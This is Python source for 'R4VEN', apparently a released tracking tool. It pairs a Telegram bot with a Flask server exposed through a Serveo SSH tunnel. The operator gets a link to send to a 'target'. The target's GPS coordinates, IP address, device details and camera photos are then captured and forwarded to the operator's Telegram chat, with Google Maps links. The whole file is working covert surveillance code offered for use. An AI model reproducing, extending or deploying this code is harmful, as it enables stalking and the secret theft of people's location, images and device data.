#!/usr/bin/env python3
import os
import sys
import threading
import logging
import time
import requests
import json
import signal
import subprocess
import re
import socket
from flask import Flask, request, Response, send_from_directory
import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
import argparse

# Set up logging
log_file = "r4ven.log"
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')

# Terminal colors
if sys.stdout.isatty():
    R = '\033[31m'  # Red
    G = '\033[32m'  # Green
    C = '\033[36m'  # Cyan
    W = '\033[0m'   # Reset
    Y = '\033[33m'  # Yellow
    M = '\033[35m'  # Magenta
    B = '\033[34m'  # Blue
else:
    R = G = C = W = Y = M = B = ''

# Global variables
HTML_FILE_NAME = "index.html"
VERSION = '1.1.5'
twitter_url = 'https://spyboy.in/twitter'
discord = 'https://spyboy.in/Discord'
blog = 'https://spyboy.blog/'
github = 'https://github.com/spyboy-productions/r4ven'

# Global flag to handle graceful shutdown
shutdown_flag = threading.Event()

# Flask app
app = Flask(__name__)

# Command line arguments
parser = argparse.ArgumentParser(
    description="R4VEN Telegram Bot - Track device location, IP address, and capture photos with device details.",
    usage=f"{sys.argv[0]} [-p port] [-t token]"
)
parser.add_argument("-p", "--port", nargs="?", help="port to listen on", type=int, default=8000)
parser.add_argument("-t", "--token", nargs="?", help="Telegram bot token", required=True)
args = parser.parse_args()

# Initialize Telegram bot
bot = telebot.TeleBot(args.token)

# Active sessions storage: {chat_id: {folder_name, target_url}}
active_sessions = {}

def signal_handler(sig, frame):
    """Handles termination signals like CTRL+C."""
    print(f"{R}Exiting...{W}")
    shutdown_flag.set()  # Set the shutdown flag to terminate threads
    sys.exit(0)

# Attach signal handler for CTRL+C
signal.signal(signal.SIGINT, signal_handler)

def print_banner():
    """Prints the program banner"""
    if sys.stdout.isatty():
        sys.stdout.reconfigure(encoding='utf-8')
        banner = f'''{R}                                                    
                    _.:._
                  ."\ | /".
{R}.,__{G}              "=.\:/.="              {R}__,.
 {R}"=.`"=._{G}            /^\            {R}_.="`.="
   ".'.'."{B}=.=.=.=.-,/   \,-{B}.=.=.=.=".{R}'.'."
     `~.`.{M}`.`.`.`.`.     .'.'.'.'.'.'{R}.~`
        `~.`` {M}` `{R}.`.\   /.'{M}.' ' ''{R}.~`
   {G}R4ven-Telegram{R}   `=.-~~-._ ) ( _.-~~-.=`
                    `\ /`
                     ( )
                      Y

{R}Track{W} {G}GPS location{W}, and {G}IP address{W}, and {G}capture photos{W} with {G}device details{W}.
'''
    else:
        banner = ''
    
    print(f'{R}{banner}{W}')
    print(f'{G}[+] {C}Version     : {W}{VERSION}')
    print(f'{G}[+] {C}Created By  : {W}Spyboy')
    print(f'{G}[+] {C}Twitter     : {W}{twitter_url}')
    print(f'{G}[+] {C}Discord     : {W}{discord}')
    print(f'{G}[+] {C}Blog        : {W}{blog}')
    print(f'{G}[+] {C}Github      : {W}{github}')
    print(f'____________________________________________________________________________\n')

def get_file_data(file_path):
    """Gets the file data from a file"""
    with open(file_path, 'r') as open_file:
        return open_file.read()

def is_port_available(port):
    """Check if a port is available."""
    print(f"{B}[?] {C}Checking if port {Y}{port}{W} is available...{W}", end="", flush=True)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        if sock.connect_ex(("127.0.0.1", port)) != 0:
            print(f" {G}[AVAILABLE]{W}")
            return True
        else:
            print(f" {R}[IN USE]{W}")
            return False

def should_exclude_line(line):
    """Determines if a line should be excluded from output"""
    exclude_patterns = [
        "HTTP request"
    ]
    return any(pattern in line for pattern in exclude_patterns)

@app.route("/", methods=["GET"])
def get_website():
    """Serves the main HTML file"""
    chat_id = request.args.get('id', '')
    folder_name = active_sessions.get(chat_id, {}).get('folder_name', 'all')
    
    html_data = ""
    try:
        html_data = get_file_data(os.path.join(folder_name, HTML_FILE_NAME))
    except FileNotFoundError:
        pass
    return Response(html_data, content_type="text/html")

@app.route("/location_update", methods=["POST"])
def update_location():
    """Handles location updates from the target"""
    data = request.json or {}
    chat_id = request.args.get('id', '')
    
    print(f"{G}[+] {C}UPDATE_LOCATION_CALLED chat_id={chat_id} data={data}{W}")

    if chat_id and chat_id in active_sessions:
        print(f"{G}[+] {C}Sending now...{W}")
        
        # Check the type of data being sent
        if 'embeds' in data and data['embeds']:
            embed = data['embeds'][0]
            
            # System Information
            if 'author' in embed and embed['author']['name'] == 'Target System Information..':
                # Extract description content
                description = embed['description']
                
                # Clean up the description to remove markdown formatting
                clean_desc = description.replace('```xl\n', '').replace('```', '').replace('```autohotkey\n', '')
                
                # Format message for Telegram
                msg = "*Target System Information*\n\n"
                msg += f"*User Agent:*\n`{clean_desc.split('\n\n')[0]}`\n\n"
                
                # Extract system details
                system_info = clean_desc.split('\n\n')[1] if '\n\n' in clean_desc else clean_desc
                for line in system_info.split('\n'):
                    if ':' in line:
                        key, value = line.split(':', 1)
                        msg += f"*{key.strip()}:* `{value.strip()}`\n"
                
                try:
                    bot.send_message(chat_id, msg, parse_mode="Markdown")
                except Exception as e:
                    logging.error(f"Error sending system info to Telegram: {e}")
                    # Fallback to plain text if markdown fails
                    bot.send_message(chat_id, msg.replace('*', '').replace('`', ''))
            
            # IP Information
            elif 'author' in embed and embed['author']['name'] == 'Target Ip':
                description = embed['description']
                
                # Extract IP from description
                ip_match = re.search(r'```xl\n(.+?)```', description)
                ip = ip_match.group(1) if ip_match else "Unknown"
                
                # Extract IP details URL
                ip_details_url = re.search(r'IP Details:\*\* (https?://[^\s]+)', description)
                details_url = ip_details_url.group(1) if ip_details_url else ""
                
                # Get footer text
                footer_text = ""
                if 'footer' in embed and 'text' in embed['footer']:
                    footer_text = embed['footer']['text']
                
                # Format message for Telegram
                msg = "*Target IP Information*\n\n"
                msg += f"*IP Address:* `{ip}`\n\n"
                if details_url:
                    msg += f"[IP Details]({details_url})\n\n"
                if footer_text:
                    msg += f"_Note: {footer_text}_"
                
                try:
                    bot.send_message(chat_id, msg, parse_mode="Markdown")
                except Exception as e:
                    logging.error(f"Error sending IP info to Telegram: {e}")
                    bot.send_message(chat_id, msg.replace('*', '').replace('`', '').replace('[', '').replace(']', ''))
            
            # IP Reconnaissance
            elif 'author' in embed and embed['author']['name'] == 'IP Address Reconnaissance':
                description = embed['description']
                
                # Clean up the description
                clean_desc = description.replace('```autohotkey\n', '').replace('```', '')
                
                # Format message for Telegram
                msg = "*IP Address Reconnaissance*\n\n"
                
                # Extract all key-value pairs
                for line in clean_desc.split('\n'):
                    if ':' in line:
                        key, value = line.split(':', 1)
                        msg += f"*{key.strip()}:* `{value.strip()}`\n"
                
                # If we have lat/lon coordinates, add a map link
                lat_match = re.search(r'Lat: ([^\n]+)', clean_desc)
                lon_match = re.search(r'Lon: ([^\n]+)', clean_desc)
                
                if lat_match and lon_match:
                    lat = lat_match.group(1).strip()
                    lon = lon_match.group(1).strip()
                    msg += f"\n[View on Google Maps](https://www.google.com/maps?q={lat},{lon})"
                
                try:
                    bot.send_message(chat_id, msg, parse_mode="Markdown")
                except Exception as e:
                    logging.error(f"Error sending IP recon to Telegram: {e}")
                    bot.send_message(chat_id, msg.replace('*', '').replace('`', '').replace('[', '').replace(']', ''))
            
            # GPS Location part with HTML formatting
            elif 'title' in embed and embed['title'] == 'GPS location of target..':
                description = embed['description']
                
                # Extract lat/long from description
                lat_match = re.search(r'Latitude:([^\n]+)', description)
                lon_match = re.search(r'Longitude:([^\n]+)', description)
                
                # Format message for Telegram
                msg = "<b>GPS Location of Target</b>\n\n"
                
                if lat_match and lon_match:
                    lat = lat_match.group(1).strip()
                    lon = lon_match.group(1).strip()
                    
                    msg += f"<b>Latitude:</b> <code>{lat}</code>\n"
                    msg += f"<b>Longitude:</b> <code>{lon}</code>\n\n"
                    msg += f"<a href='https://www.google.com/maps?q={lat},{lon}'>View on Google Maps</a>\n"
                    msg += f"<a href='https://earth.google.com/web/search/{lat},{lon}'>View on Google Earth</a>"
                
                # Add footer if present
                if 'footer' in embed and 'text' in embed['footer']:
                    msg += f"\n\n<i>Note: {embed['footer']['text']}</i>"
                
                try:
                    bot.send_message(chat_id, msg, parse_mode="HTML")  # Change to HTML here
                except Exception as e:
                    logging.error(f"Error sending GPS info to Telegram: {e}")
                    bot.send_message(chat_id, msg.replace('<b>', '').replace('</b>', '').replace('<code>', '').replace('</code>', '').replace('<a href=', '').replace('</a>', ''))
        
        # Permission denied message
        elif 'content' in data and 'User denied the request for Geolocation' in data.get('content', ''):
            msg = "*Location Permission Denied*\n\nThe target denied the request for geolocation access."
            bot.send_message(chat_id, msg, parse_mode="Markdown")
        
        # Generic message for unrecognized data
        else:
            logging.info(f"Received data in unknown format: {data}")
            msg = "*Data Received*\n\nReceived information from target, but couldn't parse it into a known format."
            bot.send_message(chat_id, msg, parse_mode="Markdown")
    
    return "OK"

@app.route('/image', methods=['POST'])
def image():
    """Handles image captures from the target"""
    chat_id = request.args.get('id', '')
    if 'image' not in request.files or chat_id not in active_sessions:
        return Response("Error: No image or invalid session")
    
    img = request.files['image']
    filename = f"capture_{time.strftime('%Y%m%d-%H%M%S')}.jpeg"
    img.save(filename)
    
    # Send image to Telegram with caption
    try:
        with open(filename, 'rb') as photo:
            bot.send_photo(chat_id, photo, caption="📸 Target's photo captured!")
    except Exception as e:
        logging.error(f"Error sending image to Telegram: {e}")
        return Response("Error sending image")
    
    return Response("Image captured and sent")

@app.route('/get_target', methods=['GET'])
def get_url():
    """Returns the target URL for redirecting captured data"""
    chat_id = request.args.get('id', '')
    if chat_id in active_sessions:
        return active_sessions[chat_id].get('target_url', '')
    return ''

def start_port_forwarding(chat_id):
    """Starts port forwarding with Serveo and notifies user via Telegram"""
    # Convert chat_id to int for Telegram API if it's a string
    telegram_chat_id = int(chat_id) if isinstance(chat_id, str) and chat_id.isdigit() else chat_id
    
    bot.send_message(telegram_chat_id, "⏳ Setting up port forwarding with Serveo...")
    
    try:
        command = ["ssh", "-R", f"80:localhost:{args.port}", "serveo.net"]
        logging.info("Starting port forwarding with command: %s", " ".join(command))
        
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        url_printed = False
        for line in process.stdout:
            line = line.strip()
            if line:
                if "Forwarding HTTP traffic from" in line and not url_printed:
                    url = line.split(' ')[-1]
                    # Add chat_id as query parameter to identify the session
                    tracking_url = f"{url}?id={chat_id}"
                    
                    formatted_url_message = f"🔗 Send this URL to your target: {tracking_url}"
                    bot.send_message(telegram_chat_id, formatted_url_message)
                    
                    # Save the target URL for this session
                    active_sessions[chat_id]['target_url'] = f"{url}/image?id={chat_id}"
                    
                    logging.info(f"URL generated for chat {chat_id}: {tracking_url}")
                    url_printed = True
                elif not should_exclude_line(line):
                    logging.info(line)
        
        # If no URL was generated after a reasonable time
        if not url_printed:
            time.sleep(10)  # Wait a bit more
            if not url_printed:
                bot.send_message(telegram_chat_id, "❌ Failed to get a URL from Serveo. Please try again later.")
    except Exception as e:
        error_msg = f"❌ An error occurred with port forwarding: {str(e)}"
        logging.error(error_msg)
        bot.send_message(telegram_chat_id, error_msg)

def run_flask():
    """Starts the Flask server"""
    app.run(host="0.0.0.0", port=args.port, debug=True, use_reloader=False)

# Telegram bot command handlers
@bot.message_handler(commands=['start'])
def handle_start(message):
    """Handles the /start command"""
    # Clear any existing session for this user
    if message.chat.id in active_sessions:
        del active_sessions[message.chat.id]
    
    welcome_msg = (
        f"🦅 *Welcome to R4ven Tracker Bot* 🦅\n\n"
        f"What would you like to do?\n\n"
        f"1. Track Target GPS Location\n"
        f"2. Capture Target Image\n"
        f"3. Fetch Target IP Address\n"
        f"4. All Of It\n\n"
        f"_Note: IP address & Device details available in all options_"
    )
    
    # Create reply keyboard
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.row(KeyboardButton("1"), KeyboardButton("2"))
    markup.row(KeyboardButton("3"), KeyboardButton("4"))
    
    bot.send_message(message.chat.id, welcome_msg, parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text in ["1", "2", "3", "4"] and message.chat.id not in active_sessions)
def handle_option_selection(message):
    """Handles the option selection"""
    chat_id = str(message.chat.id)
    choice = message.text
    
    # Map choice to folder
    if choice == '1':
        folder_name = 'gps'
        feature = "GPS Location Tracking"
    elif choice == '2':
        folder_name = 'cam'
        feature = "Camera Capture"
    elif choice == '3':
        folder_name = 'ip'
        feature = "IP Address Tracking"
    elif choice == '4':
        folder_name = 'all'
        feature = "Full Tracking (GPS, Camera, IP)"
    
    # Create session
    active_sessions[chat_id] = {
        'folder_name': folder_name,
        'target_url': f"http://localhost:{args.port}/image?id={chat_id}"
    }
    
    #bot.send_message(chat_id, f"✅ Selected: *{feature}*\n\nPreparing tracking link...", parse_mode="Markdown")
    bot.send_message(message.chat.id, f"✅ Selected: *{feature}*\n\nPreparing tracking link...", parse_mode="Markdown")
    
    # Start port forwarding in a separate thread
    threading.Thread(target=start_port_forwarding, args=(chat_id,), daemon=True).start()

@bot.message_handler(func=lambda message: True)
def handle_all_other_messages(message):
    """Handles all other messages"""
    bot.send_message(
        message.chat.id, 
        "⚠️ Please use /start to begin tracking or select a valid option (1-4)."
    )

def main():
    """Main function"""
    print_banner()
    
    if not is_port_available(args.port):
        print(f"{R}Error: Port {args.port} is already in use. Please select another port.{W}")
        sys.exit(1)
    
    # Check if required folders exist
    required_folders = ['gps', 'cam', 'ip', 'all']
    for folder in required_folders:
        if not os.path.exists(folder):
            print(f"{R}Error: Required folder '{folder}' does not exist.{W}")
            sys.exit(1)
    
    # Start Flask server in a separate thread
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    print(f"{G}[+] {C}Flask server started! Running on {W}http://127.0.0.1:{args.port}/{W}")
    print(f"{G}[+] {C}Telegram bot starting...{W}")
    
    # Start the bot
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"{R}Error with Telegram bot: {e}{W}")
        shutdown_flag.set()

if __name__ == "__main__":
    main()
